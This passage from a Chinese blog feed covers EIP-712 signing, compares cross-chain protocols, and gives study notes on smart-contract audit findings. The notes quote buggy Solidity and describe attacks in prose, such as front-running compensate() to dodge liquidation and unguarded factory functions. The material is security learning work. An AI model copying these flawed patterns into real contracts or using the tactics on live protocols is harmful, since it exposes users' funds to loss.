order.expiry</span><br><span class="line">));</span><br></pre></td></tr></table></figure><ol start="4"><li><strong>生成最终哈希：</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes32 hash = MessageHashUtils.toTypedDataHash(DOMAIN_SEPARATOR, orderHash);</span><br></pre></td></tr></table></figure><ol start="5"><li><strong>签名和验证：</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address signer = ECDSA.recover(hash, signature);</span><br><span class="line">require(signer == expectedSigner, &quot;Invalid signature&quot;);</span><br></pre></td></tr></table></figure><hr><h3 id="✅-EIP-712-的优势"><a href="#✅-EIP-712-的优势" class="headerlink" title="✅ EIP-712 的优势"></a>✅ <strong>EIP-712 的优势</strong></h3><ul><li><strong>安全性</strong>：通过结构化的数据和域分隔符避免了签名的篡改和重放攻击。</li><li><strong>用户体验</strong>：用户可以明确看到他们签名的数据内容，避免不必要的误签。</li><li><strong>跨链和跨平台一致性</strong>：EIP-712 使得不同链或应用间能够一致地处理结构化数据的签名和验证。</li></ul><hr><h3 id="🏆-总结"><a href="#🏆-总结" class="headerlink" title="🏆 总结"></a>🏆 <strong>总结</strong></h3><p>EIP-712 允许以太坊智能合约验证<strong>结构化数据的签名</strong>，避免了直接对原始字节流进行签名的风险。它通过域分隔符、类型哈希和结构化数据，提供了一个<strong>安全、灵活、易用的签名机制</strong>，广泛应用于 DApp、DeFi、NFT 等领域。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨链合约时代：Axelar、Wormhole、Hyperlane 谁能称霸多链通信？</title>
      <link href="/2025/04/24/%E8%B7%A8%E9%93%BE%E5%90%88%E7%BA%A6%E6%97%B6%E4%BB%A3%EF%BC%9AAxelar%E3%80%81Wormhole%E3%80%81Hyperlane-%E8%B0%81%E8%83%BD%E7%A7%B0%E9%9C%B8%E5%A4%9A%E9%93%BE%E9%80%9A%E4%BF%A1%EF%BC%9F/"/>
      <url>/2025/04/24/%E8%B7%A8%E9%93%BE%E5%90%88%E7%BA%A6%E6%97%B6%E4%BB%A3%EF%BC%9AAxelar%E3%80%81Wormhole%E3%80%81Hyperlane-%E8%B0%81%E8%83%BD%E7%A7%B0%E9%9C%B8%E5%A4%9A%E9%93%BE%E9%80%9A%E4%BF%A1%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="跨链合约时代：Axelar、Wormhole、Hyperlane-谁能称霸多链通信？"><a href="#跨链合约时代：Axelar、Wormhole、Hyperlane-谁能称霸多链通信？" class="headerlink" title="跨链合约时代：Axelar、Wormhole、Hyperlane 谁能称霸多链通信？"></a>跨链合约时代：Axelar、Wormhole、Hyperlane 谁能称霸多链通信？</h1><p>随着区块链技术的快速发展，跨链通信已经成为了区块链生态系统中的重要组成部分。跨链协议允许不同的区块链之间进行信息传递和资产互操作，从而打破了各个链之间的孤立局面。Axelar、Wormhole 和 Hyperlane 作为三大跨链协议的代表，它们在多链通信的实现上各具特色。那么，谁能称霸跨链合约时代，成为未来的多链通信标准呢？</p><h2 id="一、跨链协议的背景"><a href="#一、跨链协议的背景" class="headerlink" title="一、跨链协议的背景"></a>一、跨链协议的背景</h2><p>随着区块链的多样化发展，去中心化金融（DeFi）、NFT、游戏和其他应用程序已经不再局限于单一链上运行。不同区块链之间的数据和资产流通需求日益增加。然而，不同链之间缺乏统一的通信协议，导致了跨链操作的复杂性和不兼容性。因此，跨链协议应运而生，它们旨在提供链与链之间的高效、安全和可扩展的通信机制。</p><p>跨链协议不仅仅是为了解决资产的流动问题，更重要的是推动去中心化应用（DApp）和去中心化自治组织（DAO）等创新模式的实现。</p><h2 id="二、Axelar：跨链的互联网"><a href="#二、Axelar：跨链的互联网" class="headerlink" title="二、Axelar：跨链的互联网"></a>二、Axelar：跨链的互联网</h2><p>Axelar 提供了一个简单、安全且去中心化的跨链解决方案，其目标是成为一个“区块链互联网”。Axelar 使用统一的消息传递协议，使得开发者能够轻松在多个区块链之间进行交互。通过其专有的跨链消息传递平台，Axelar 能够为不同区块链上的 DApp 提供资产转移、智能合约执行等功能。</p><p>技术优势：</p><p>统一的跨链消息格式：Axelar 使用通用的消息格式，不需要为每个目标链单独编写代码，从而大大简化了跨链操作。</p><p>多链支持：Axelar 支持包括以太坊、Cosmos、Polkadot 等多个链的互操作性，真正实现了跨链的普适性。</p><p>去中心化的验证：Axelar 网络使用去中心化的验证者来保证跨链通信的安全性。</p><p>Axelar 的优势在于其强大的跨链能力和用户友好的接口，适合需要跨链互操作的大型跨链 DApp。</p><h2 id="三、Wormhole：连接生态的桥梁"><a href="#三、Wormhole：连接生态的桥梁" class="headerlink" title="三、Wormhole：连接生态的桥梁"></a>三、Wormhole：连接生态的桥梁</h2><p>Wormhole 是由多个去中心化的协议和项目（如 Solana、Ethereum、Terra 等）共同支持的跨链协议。它的设计目的是通过一个轻量级的桥梁连接不同的区块链生态。Wormhole 采用“中继链”的概念，利用其核心智能合约在不同链之间传递信息和资产。</p><p>技术优势：</p><p>高效的跨链传输：Wormhole 提供了高吞吐量的跨链数据传输，特别适合高频交易和资产交换的场景。</p><p>跨链资产支持：它支持多个资产的跨链转移，特别是在 Solana 和 Ethereum 之间的资产流动表现出色。</p><p>轻量级设计：Wormhole 通过“守护程序”机制，避免了传统跨链协议的复杂性，使跨链操作更加轻便。</p><p>Wormhole 的优势在于其生态连接能力，能够打通多个主要公链之间的资产和信息流动，特别适合需要高频资产流动的去中心化交易所（DEX）和跨链金融应用。</p><h2 id="四、Hyperlane：跨链的安全防线"><a href="#四、Hyperlane：跨链的安全防线" class="headerlink" title="四、Hyperlane：跨链的安全防线"></a>四、Hyperlane：跨链的安全防线</h2><p>Hyperlane 是一种相对较新的跨链协议，其核心思想是通过智能合约来保证不同链之间的数据和资产的安全性。Hyperlane 使用了多重签名和门限签名技术，确保跨链操作的每个环节都能得到严格的验证，降低了中间环节出现攻击的风险。</p><p>技术优势：</p><p>安全性：Hyperlane 通过多重签名和门限签名机制，提供了比其他协议更高的安全性，特别适合对安全性有高要求的应用场景。</p><p>灵活性：Hyperlane 支持灵活的跨链通信方式，开发者可以根据实际需求选择最合适的协议进行交互。</p><p>去中心化：Hyperlane 致力于去中心化的跨链操作，确保了信息流动的透明性和公正性。</p><p>Hyperlane 的优势在于其高安全性和灵活的设计，适合对数据安全性要求极高的跨链应用，特别是涉及敏感资产或需要保护用户隐私的 DApp。</p><h2 id="五、对比分析：谁能称霸多链通信？"><a href="#五、对比分析：谁能称霸多链通信？" class="headerlink" title="五、对比分析：谁能称霸多链通信？"></a>五、对比分析：谁能称霸多链通信？</h2><p>Axelar 的强大之处在于其广泛的多链支持和简洁的跨链消息格式，适合大规模的跨链生态系统，尤其是在多个区块链上运行的应用。</p><p>Wormhole 通过高效的跨链传输和轻量级的设计，特别适合 DeFi 和 DEX 等需要高频资产交换的场景。</p><p>Hyperlane 在安全性方面表现突出，适合需要对交易安全性和数据保护有高要求的应用。</p><p>从未来发展趋势来看，Axelar 可能会因为其广泛的生态支持和简便的开发接口，成为跨链通信的主流选择。与此同时，Wormhole 在 DeFi 和资产交换领域也将保持重要地位，而Hyperlane 在强调安全性和隐私保护的应用场景中有着独特的优势。</p><h3 id="构建跨链DApp比较"><a href="#构建跨链DApp比较" class="headerlink" title="构建跨链DApp比较"></a>构建跨链DApp比较</h3><table><thead><tr><th>协议</th><th>合约开发方式</th><th>消息发送方式</th><th>中继机制</th><th>验证方式</th></tr></thead><tbody><tr><td>Axelar</td><td>实现 <code>IAxelarExecutable</code> 接口，使用 SDK</td><td><code>callContract</code> &#x2F; <code>callContractWithToken</code></td><td>官方 relayer + gossip 网络</td><td>去中心化多签</td></tr><tr><td>Wormhole</td><td>每个链部署自己的 “Messenger” 合约，注册目标地址</td><td><code>postMessage</code> → VAA 消息格式</td><td>Guardian 网络中继（19 节点）</td><td>Guardian 签名</td></tr><tr><td>Hyperlane</td><td>自部署 Outbox + Inbox 合约，自选中继</td><td><code>dispatch()</code> → 收件链 ISM 解析</td><td>开放中继市场（Sovereign relayer）</td><td>可插拔验证模块 ISM</td></tr></tbody></table><h3 id="支持链比较"><a href="#支持链比较" class="headerlink" title="支持链比较"></a>支持链比较</h3><table><thead><tr><th>协议</th><th>支持链类型</th><th>覆盖链代表</th></tr></thead><tbody><tr><td>Axelar</td><td>EVM + Cosmos</td><td>Ethereum、Polygon、Avalanche、Osmosis、Injective 等</td></tr><tr><td>Wormhole</td><td>EVM + Solana + Cosmos + Aptos + Sui</td><td>Ethereum、BNB、Solana、Sei、Sui、Aptos 等</td></tr><tr><td>Hyperlane</td><td>模块化支持</td><td>Ethereum、Polygon、Celo、Cosmos 链等，可拓展链</td></tr></tbody></table><p>六、结语<br>跨链协议是区块链发展中的重要基石。随着技术的不断进步，Axelar、Wormhole 和 Hyperlane 将不断完善其跨链功能，为多链世界提供更为高效、安全和灵活的通信工具。未来的区块链将不再是孤岛，而是通过这些跨链协议实现无缝连接，为去中心化应用的创新和发展提供更多可能。谁能称霸多链通信，或许最终会由开发者和市场的需求来决定。</p><p>跨链合约时代，谁将引领风潮？让我们拭目以待！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>codehawk-Liquidity Management</title>
      <link href="/2025/04/18/codehawk-Liquidity-Management/"/>
      <url>/2025/04/18/codehawk-Liquidity-Management/</url>
      
        <content type="html"><![CDATA[<h1 id="高-执行逻辑错误的参数"><a href="#高-执行逻辑错误的参数" class="headerlink" title="高 执行逻辑错误的参数"></a>高 执行逻辑错误的参数</h1><p>漏洞代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line">   * @notice 此函数是提款流程的结束。</span><br><span class="line">   * @dev 应更新所有必要的全局状态变量</span><br><span class="line">   * </span><br><span class="line">   * @param withdrawn 从头寸中提取的代币数量</span><br><span class="line">   * @param positionClosed 当完全通过提款关闭头寸时为真，否则为假</span><br><span class="line">   */</span><br><span class="line">  function _handleReturn(uint256 withdrawn, bool positionClosed, bool refundFee) internal &#123;</span><br><span class="line">    (uint256 depositId) = flowData;</span><br><span class="line">    uint256 shares = depositInfo[depositId].shares;</span><br><span class="line">    uint256 amount;</span><br><span class="line">    if (positionClosed) &#123;</span><br><span class="line">      amount = collateralToken.balanceOf(address(this)) * shares / totalShares;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      uint256 balanceBeforeWithdrawal = collateralToken.balanceOf(address(this)) - withdrawn;</span><br><span class="line">      amount = withdrawn + balanceBeforeWithdrawal * shares / totalShares;</span><br><span class="line">    &#125;</span><br><span class="line">    if (amount &gt; 0) &#123;</span><br><span class="line">      _transferToken(depositId, amount);</span><br><span class="line">    &#125;</span><br><span class="line">    emit Burned(depositId, depositInfo[depositId].recipient, depositInfo[depositId].shares, amount);</span><br><span class="line">    _burn(depositId);</span><br><span class="line"></span><br><span class="line">    if (refundFee) &#123;</span><br><span class="line">      uint256 usedFee = callbackGasLimit * tx.gasprice;</span><br><span class="line">      if (depositInfo[depositId].executionFee &gt; usedFee) &#123;</span><br><span class="line">        try IGmxProxy(gmxProxy).refundExecutionFee(depositInfo[counter].owner, depositInfo[counter].executionFee - usedFee) &#123;&#125; catch &#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 更新全局状态</span><br><span class="line">    delete swapProgressData;</span><br><span class="line">    delete flowData;</span><br><span class="line">    delete flow;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在 <code>refundFee</code> 代码块中，它检查了 <code>depositInfo[depositId].executionFee</code>，但在调用 <code>refundExecutionFee</code> 时却使用了 <code>depositInfo[counter]</code>。<code>counter</code> 是一个状态变量，仅在有新存款时递增1，而 depositId 来自 flowData，它被更新为请求提款的用户预期的存款ID值</p><blockquote><p>调用函数时，具体分析每一个参数的意义，如果函数上下文使用不同的参数的话那么就要注意一下会不会时参数使用错误</p></blockquote><h1 id="高-计算错误，本意是计算部分的头寸，计算成了整个的"><a href="#高-计算错误，本意是计算部分的头寸，计算成了整个的" class="headerlink" title="高 计算错误，本意是计算部分的头寸，计算成了整个的"></a>高 计算错误，本意是计算部分的头寸，计算成了整个的</h1><p>漏洞代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getPnl(</span><br><span class="line">    bytes32 key,</span><br><span class="line">    MarketPrices memory prices,</span><br><span class="line">    uint256 sizeDeltaUsd</span><br><span class="line">  ) external view returns (int256) &#123;</span><br><span class="line">    uint256 sizeInTokens = getPositionSizeInUsd(key);</span><br><span class="line">    if (sizeInTokens == 0) return 0;</span><br><span class="line">    </span><br><span class="line">    PositionInfo memory positionInfo = gmxReader.getPositionInfo(</span><br><span class="line">      address(dataStore),</span><br><span class="line">      referralStorage,</span><br><span class="line">      key,</span><br><span class="line">      prices,</span><br><span class="line">      sizeDeltaUsd,</span><br><span class="line">      address(0),</span><br><span class="line">      true</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    return positionInfo.pnlAfterPriceImpactUsd;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在 <code>PerpetualVault::_withdraw</code> 函数中存在一个漏洞，特别是在计算盈亏（PnL）扣除时。问题是由于使用了 <code>gmxReader.getPositionInfo</code>，并将参数 <code>usePositionSizeAsSizeDeltaUsd</code> 设置为 true，导致 PnL 是针对整个头寸计算的，而不是仅针对用户的份额。这导致从用户的提款金额中扣除过多，不公平地减少了他们的资金。</p><blockquote><p>实际上就是参数设置错误了，导致使用了全部的头寸</p></blockquote><h1 id="高-过早的删除数据"><a href="#高-过早的删除数据" class="headerlink" title="高 过早的删除数据"></a>高 过早的删除数据</h1><p>漏洞代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _handleReturn(uint256 withdrawn, bool positionClosed, bool refundFee) internal &#123;</span><br><span class="line">  (uint256 depositId) = flowData;</span><br><span class="line">  uint256 shares = depositInfo[depositId].shares;</span><br><span class="line">  uint256 amount;</span><br><span class="line">  if (positionClosed) &#123;</span><br><span class="line">    amount = collateralToken.balanceOf(address(this)) * shares / totalShares;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    uint256 balanceBeforeWithdrawal = collateralToken.balanceOf(address(this)) - withdrawn;</span><br><span class="line">    amount = withdrawn + balanceBeforeWithdrawal * shares / totalShares;</span><br><span class="line">  &#125;</span><br><span class="line">  if (amount &gt; 0) &#123;</span><br><span class="line">    _transferToken(depositId, amount);</span><br><span class="line">  &#125;</span><br><span class="line">  emit Burned(depositId, depositInfo[depositId].recipient, depositInfo[depositId].shares, amount);</span><br><span class="line">  _burn(depositId);</span><br><span class="line"></span><br><span class="line">  if (refundFee) &#123;</span><br><span class="line">    uint256 usedFee = callbackGasLimit * tx.gasprice;</span><br><span class="line">    if (depositInfo[depositId].executionFee &gt; usedFee) &#123;  // 检查是否有剩余，但最终会失败</span><br><span class="line">      try IGmxProxy(gmxProxy).refundExecutionFee(depositInfo[counter].owner, depositInfo[counter].executionFee - usedFee) &#123;&#125; catch &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 更新全局状态</span><br><span class="line">  delete swapProgressData;</span><br><span class="line">  delete flowData;</span><br><span class="line">  delete flow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">function _burn(uint256 depositId) internal &#123;</span><br><span class="line">  EnumerableSet.remove(userDeposits[depositInfo[depositId].owner], depositId);</span><br><span class="line">  totalShares = totalShares - depositInfo[depositId].shares;</span><br><span class="line">  delete depositInfo[depositId];  // 删除 depositId 的映射</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在执行 &#96;&#96;PerpetualVault::_handleReturn() <code>函数期间，会调用 _burn() 函数，该函数会销毁用户的份额并删除跟踪用户存款的 depositInfo 映射。在销毁份额之后，函数启动退款费用流程，检查 </code>depositInfo[depositId].executionFee &gt; usedFee &#96;以确定执行费用是否大于已使用的费用。然而，即使执行费用高于已使用的费用，这个条件也永远不会被执行，因为包含用户给出的执行费用等关键数据的 depositInfo 映射已经被删除。结果，用户可能会因为未处理的退款而遭受资金损失</p><blockquote><p>对于删除的数据时，联想到会不会影响到其他效果</p></blockquote><h1 id="高-在计算头寸的净值时使用了头寸费用"><a href="#高-在计算头寸的净值时使用了头寸费用" class="headerlink" title="高 在计算头寸的净值时使用了头寸费用"></a>高 在计算头寸的净值时使用了头寸费用</h1><p>头寸费用是按照头寸大小的一定百分比计算的，这部分费用应该从用户的存款中扣除，但在计算总金额时被错误地忽略了。<br>这导致后续存款的用户获得的份额比他们应得的要多，因为总金额被高估了</p><h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子:"></a>一个例子:</h2><p>考虑以下示例（为了示例的目的，我们可以假设没有借款&#x2F;资金费用，两次增加操作之间的指数代币价格相同）：<br>我们有一个头寸，有 $1000 的抵押品和 $3000 的头寸规模（以美元计）。假设头寸费用是 0.33%（根据头寸规模计算），我们有 1000e14 总份额（1000e6 * 1e8）<br>Alice 存入价值 $1000 的抵押品，并获得了 1000e6 * totalShares &#x2F; 1000e6 - (positionFee) 份额，这等于 <code>1000e6 * 1000e14 / 1000e6 - 10e6，即 99999999990000000</code> 份额<br>Bob 在 Alice 之后立即存入 $1000 份额，由于指数代币价格相同且没有资金&#x2F;借款费用，Bob 应该获得相同数量的份额。<br>计算 Bob 的份额，我们得到 <code>1000e6 * (1000e14 + Alice&#39;s shares) / (1000e6 + Alice&#39;s increase - positionFee)</code>，这等于<code> 1000e6 * (1000e14 + 99999999990000000) / uint(1990e6 - 20e6)</code>，即 101522842634517766<br>每个连续的存款人将获得越来越多的不公平份额</p><h1 id="高-计算价格的方式有些简单"><a href="#高-计算价格的方式有些简单" class="headerlink" title="高 计算价格的方式有些简单"></a>高 计算价格的方式有些简单</h1><p>这是Gamma计算价格影响的简化版本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">priceImpactInCollateralTokens = ((sizeDeltaInUsd / prices.indexTokenPrice.min) - (curSizeInTokens - prevSizeInTokens)) * prices.indexTokenPrice.min / prices.shortTokenPrice.min</span><br></pre></td></tr></table></figure><p>基本上，它取<code>sizeDeltaInUsd</code>变量（这是从GMX发送过来的，所以是实际值）并除以指数代币（例如WETH）的价格，因此结果是以WETH为单位的。<br>然后它取<code>curSizeInTokens</code>，即当前头寸大小（例如以WETH计）并减去<code>prevSizeInTokens</code>，即用户存款前头寸大小（以代币计）。<br>然后从第一个结果中减去第二个结果，这使得结果基本上等于：基于<code>sizeDeltaInUsd</code>的头寸变化减去以代币计的头寸变化。<br>最后，它对结果应用价格。<br>Gamma计算价格影响的方式过于简单</p><h1 id="中-不支持多个回调"><a href="#中-不支持多个回调" class="headerlink" title="中 不支持多个回调"></a>中 不支持多个回调</h1><p>漏洞函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modifier validCallback(bytes32 key, Order.Props memory order) &#123;</span><br><span class="line">    require(</span><br><span class="line">        msg.sender == address(orderHandler) ||</span><br><span class="line">        msg.sender == address(liquidationHandler) ||</span><br><span class="line">        msg.sender == address(adlHandler),</span><br><span class="line">        &quot;invalid caller&quot;</span><br><span class="line">    );</span><br><span class="line">    require(order.addresses.account == address(this), &quot;not mine&quot;);</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GmxProxy合约的<code>validCallback</code>修饰符不支持<code>GMX V2</code>中可能出现的多个<code>OrderHandler</code>的情况。通过使用角色验证或动态白名单机制，可以增强系统的灵活性和安全性，确保即使在系统更新或扩展时也能正常运行</p><p>如果GMX更新到V2版本，并且确实有多个<code>OrderHandler</code>，那么<code>Gamma</code>协议将无法正确处理这些回调，因为<code>validCallback</code>修饰符会阻止这些额外的<code>OrderHandler</code>调用回调函数。<br>这将导致<code>Gamma</code>协议无法处理与这些新<code>OrderHandler</code>相关的所有操作，可能导致协议部分或完全失效</p><h1 id="中-变量更新不及时"><a href="#中-变量更新不及时" class="headerlink" title="中 变量更新不及时"></a>中 变量更新不及时</h1><p>一旦金库被完全清算，totalDepositAmount（总存款金额）保持不变。即使存款人（withdrawer）尝试提款，totalDepositAmount也不会因depositInfo[depositId].amount（特定存款ID的金额）而减少。</p><blockquote><p>金库被清算时，并没有删除totalDepositAmount</p></blockquote><h1 id="中-全局变量改变，会影响很多"><a href="#中-全局变量改变，会影响很多" class="headerlink" title="中 全局变量改变，会影响很多"></a>中 全局变量改变，会影响很多</h1><p>如果协议更改了 lockTime（锁定时间），它应该只适用于新的存款，并且不影响现有的存款。如果延长锁定期限，用户可能被迫比预期更长的时间锁定资金，阻止了在亏损或盈利期间计划的及时提款。相反，如果缩短锁定期限，早期从旧存款中提款可能会破坏交易策略，导致被迫清算或过早平仓</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于这种流动性的合约，参数，计算，头寸计算，重点在于计算上面，这次的参数就是有很多问题</p>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cantina-size Credit</title>
      <link href="/2025/03/13/cantina-size-Credit/"/>
      <url>/2025/03/13/cantina-size-Credit/</url>
      
        <content type="html"><![CDATA[<h1 id="cantina-size-Credit"><a href="#cantina-size-Credit" class="headerlink" title="cantina-size Credit"></a>cantina-size Credit</h1><h2 id="使用owner-函数，该合约已经设置了owner为零"><a href="#使用owner-函数，该合约已经设置了owner为零" class="headerlink" title="使用owner()函数，该合约已经设置了owner为零"></a>使用owner()函数，该合约已经设置了owner为零</h2><p>漏洞代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    function reinitialize() external onlyOwner reinitializer(1_7_0) &#123;</span><br><span class="line">        // grant `AccessControlUpgradeable` roles to the `Ownable2StepUpgradeable` owner</span><br><span class="line">        _grantRole(DEFAULT_ADMIN_ROLE, owner());</span><br><span class="line">        _grantRole(PAUSER_ROLE, owner());</span><br><span class="line">        _grantRole(KEEPER_ROLE, owner());</span><br><span class="line">        _grantRole(BORROW_RATE_UPDATER_ROLE, owner());</span><br><span class="line">        // transfer `Ownable2StepUpgradeable` ownership to the zero address to keep the state consistent</span><br><span class="line">        // in a future upgrade, we can simply remove `Ownable2StepUpgradeable` from the implementation</span><br><span class="line">-&gt;       _transferOwnership(address(0));  //设置owner为零</span><br><span class="line">        // can only be called once</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>后续在创造Market市场，使用owner()函数，直接使用的该合约的地址，为零</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    function createMarket(</span><br><span class="line">        InitializeFeeConfigParams calldata feeConfigParams,</span><br><span class="line">        InitializeRiskConfigParams calldata riskConfigParams,</span><br><span class="line">        InitializeOracleParams calldata oracleParams,</span><br><span class="line">        InitializeDataParams calldata dataParams</span><br><span class="line">    ) external onlyRole(DEFAULT_ADMIN_ROLE) returns (ISize market) &#123;</span><br><span class="line">        market = MarketFactoryLibrary.createMarket(</span><br><span class="line">-&gt;            sizeImplementation, **owner()**, feeConfigParams, riskConfigParams, oracleParams, dataParams</span><br><span class="line">        );</span><br><span class="line">        _addMarket(market);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>后面会对零地址的一个讨论，所以该创建市场始终不会成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function validateOwner(address owner) internal pure &#123;</span><br><span class="line">    if (owner == address(0)) &#123;</span><br><span class="line">        revert Errors.NULL_ADDRESS();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体修改就是不使用owner(),使用管理者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+         address admin = msg.sender;</span><br><span class="line">          market = MarketFactoryLibrary.createMarket(</span><br><span class="line">-            sizeImplementation, owner(), feeConfigParams, riskConfigParams, oracleParams, dataParams</span><br><span class="line">+            sizeImplementation, admin, feeConfigParams, riskConfigParams, oracleParams, dataParams</span><br><span class="line">          );</span><br></pre></td></tr></table></figure><h2 id="gas消耗，调用函数，重复使用修饰"><a href="#gas消耗，调用函数，重复使用修饰" class="headerlink" title="gas消耗，调用函数，重复使用修饰"></a>gas消耗，调用函数，重复使用修饰</h2><p>在 compensate() 函数中，使用了两次 <code>shouldNotEndUpUnderwater </code>修饰符：</p><p>一次是在 <code>compensateOnBehalfOf()</code> 函数中应用，传入了<code>externalParams.onBehalfOf </code>作为参数。<br>另一次是在 <code>compensate()</code> 函数内部，直接应用于 <code>msg.sender</code>。<br>关键点是，&#96;&#96;msg.sender<code> 在</code> compensate()<code>函数中等同于</code>externalParams.onBehalfOf<code>，因为</code> compensate()<code> 调用了</code> compensateOnBehalfOf(externalParams.onBehalfOf)&#96;。</p><p>由于两者<code>（msg.sender 和 externalParams.onBehalfOf）</code>是相同的，实际上第二次使用 <code>shouldNotEndUpUnderwater(msg.sender)</code> 是多余的。这样会导致在计算是否用户资金低于清算线<code>（underwater）</code>时，执行了重复的检查，从而增加了不必要的 gas 消耗</p><h2 id="通过前置交易还清债务，导致清算失败"><a href="#通过前置交易还清债务，导致清算失败" class="headerlink" title="通过前置交易还清债务，导致清算失败"></a>通过前置交易还清债务，导致清算失败</h2><p>借款人借钱并借款位置被清算：</p><p>假设借款人借了钱，市场发生波动，导致他们的抵押物（例如 WETH 或 USDC）价值下降，贷款比例超过了安全阈值（例如市场的风险配置）。<br>这时，清算者会尝试清算借款人的债务，回收他们的抵押物。<br>借款人如何规避清算：</p><p>借款人调用 <code>compensate()</code> 函数。这时，借款人偿还了他们的所有债务，并创建了一个新的债务位置。新位置可能是一个具有不同期限或条件的贷款。<br>这时，借款人“买时间”，原本的贷款债务被视为已经偿还，因为系统认为它已经“被清偿”了。<br>清算失败：</p><p>清算者尝试清算借款人原本的债务，但发现这个债务已经被“偿还”了，因为在 compensate() 中，借款人将原本的债务状态更新为“已偿还”，并创建了一个新的债务位置。<br>因此，清算者无法清算这个债务位置，导致清算操作失败。<br>前置交易的关键点：</p><p>前置交易<code>（front-running）</code>：借款人通过调用<code>compensate()</code>来提前偿还债务并创建新位置。这相当于“转移”了债务的负担，清算者就无法对原债务进行清算。<br>拖延清算时间：借款人通过反复创建新的债务位置，能够持续拖延清算，直到贷款的期限结束。<br>示例<br>假设借款人A（例如 Bob）借了 100 WETH，贷款期限为 7 天。如果市场不稳定，贷款在第3天就会达到清算阈值。清算者打算清算 Bob 的债务，但在清算前，Bob 调用了 compensate() 函数，偿还了他当前的债务，并创建了一个新的债务位置，这个新的债务位置可能会有不同的条件（例如不同的期限）。</p><p>当清算者再次尝试清算时，系统认为 Bob 的债务已经偿还（因为 compensate() 更新了债务状态），所以清算操作失败。Bob 通过这种方式“买了时间”，避免了清算。</p><p>影响<br>借款人：借款人通过这种方式避免了被清算，并且可以继续延缓清算，直到债务过期。<br>清算者：清算者无法收回债务，因为借款人通过 <code>compensate()</code> 创建了新的债务位置，导致原债务位置被视为已偿还。</p><h2 id="升级合约时，没有显式的调用初始化函数"><a href="#升级合约时，没有显式的调用初始化函数" class="headerlink" title="升级合约时，没有显式的调用初始化函数"></a>升级合约时，没有显式的调用初始化函数</h2><p><code>MulticallUpgradeable</code> 和 <code>AccessControlUpgradeable</code> 合约都有各自的初始化函数（例如 <code>__Multicall_init 和 __AccessControl_init</code>）。<br>这些初始化函数通常在合约部署时被调用，用于设置初始状态和配置。<br>然而，在合约升级（使用 <code>reinitialize</code>）的过程中，除非显式调用初始化函数，否则这些合约的初始化函数不会自动被调用。<br>问题的关键<br>当升级 <code>SizeFactory</code> 合约时，<code>reinitialize</code> 函数会被调用，但它没有显式调用依赖合约（<code>MulticallUpgradeable 和 AccessControlUpgradeable</code>）的初始化函数。<br>结果是，在升级之后，<code>MulticallUpgradeable</code> 和 <code>AccessControlUpgradeable</code> 合约不会被正确初始化。虽然你提到目前这个问题没有风险，因为它们的初始化函数不执行任何实际的逻辑，但如果将来这些合约的初始化函数发生变化或有逻辑执行，那么这可能会导致问题。</p><h2 id="升级后的合约，一些函数缺少修饰，导致恶意用户调用"><a href="#升级后的合约，一些函数缺少修饰，导致恶意用户调用" class="headerlink" title="升级后的合约，一些函数缺少修饰，导致恶意用户调用"></a>升级后的合约，一些函数缺少修饰，导致恶意用户调用</h2><p>在升级后，<code>createPriceFeed</code> 和 <code>createBorrowATokenV1_5 </code>函数缺少授权修饰符，这意味着任何用户都可以调用这些函数。这是一个问题，因为它允许恶意用户将恶意的价格喂价或借贷代币加入白名单，而这些恶意合约可能会被 Size 市场使用。</p><p>例如，问题可能会引发以下情况：<br>恶意价格喂价：市场可能会使用一个恶意的 UniswapV3 池合约，该合约返回不准确的价格，或者返回偏袒某些地址的价格。恶意用户可以利用这一点，将实际的抵押率调整为高于真实值，从而防止可能的清算。</p><p>恶意借贷代币：恶意借贷代币可能会使用一个恶意的变量池，如果某些用户尝试调用 <code>Size.withdraw</code>，则在 <code>NonTransferrableScaledTokenV1_5.withdraw</code> 中的 <code>variablePool.withdraw</code> 会因错误而被拒绝，从而阻止这些用户提款。</p><p><code>variablePool.withdraw(address(underlyingToken), amount, to)</code>;<br>过多的价格喂价&#x2F;借贷代币：恶意用户可以创建大量的价格喂价或借贷代币，这将导致 <code>getPriceFeeds</code> 和 <code>getBorrowATokensV1_5</code> 调用失败，因为这两个函数会遍历所有实例，可能会超出区块的 gas 限制。此外，恶意用户还可以创建具有过长描述的价格喂价或借贷代币，导致调用 